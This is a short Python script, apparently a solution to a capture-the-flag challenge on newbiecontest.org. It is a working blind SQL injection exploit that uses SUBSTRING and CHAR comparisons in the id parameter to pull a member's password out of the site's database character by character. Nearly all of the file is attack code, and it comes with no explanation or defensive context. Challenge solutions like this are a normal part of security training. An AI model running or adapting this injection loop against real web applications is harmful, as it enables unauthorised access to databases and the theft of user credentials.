# -*- coding: utf-8 -*-

import re
import requests

url = "http://hacking.newbiecontest.org:10080/ep23/index.php?pg="
# pages = index, login, lsmembres, viewmembre&id=1

def getPage(page, data={}, method="GET"):
    if method is "GET":
        r = requests.get(url+page, params=data)
    elif method is "POST":
        r = requests.post(url+page, data=data)

    return r.text

timeExtractRegexp = re.compile("Page g[^ ]+e en ([0-9\.]*s)")
def extractInfos(result):
    infos = {}
    infos['loginSuccess'] = "Mauvais login/pass" not in result
    timeExtd = timeExtractRegexp.search(result)
    infos['time'] = timeExtd.groups()[0] if timeExtd else "pattern failed"

    return infos

def decomposeInASCII(string):
    return ','.join( [ str(ord(l)) for l in string ] )


inj = "http://hacking.newbiecontest.org:10080/ep23/index.php?pg=viewmembre&id=1%20AND%20SUBSTRING(password,1,{0})=CHAR({1})"
done = False
alphanum = "azertyuiopmlkjhgfdsqwxcvbnPMOLIKUJYHTGRFEDZSAQWXCVBN0123456789"
goodpwd = ""

while not done:
    print("starting a loop with pwd = " + goodpwd)
    for char in alphanum:
        done = True
        curpwd = goodpwd + char
        length = len(curpwd)
        curpwd = decomposeInASCII(curpwd)
        req = requests.get(inj.format(length, curpwd))
        if "Membre introuvable" not in req.text:
            goodpwd += char
            done = False
            break

print("finished with pwd = " + goodpwd)
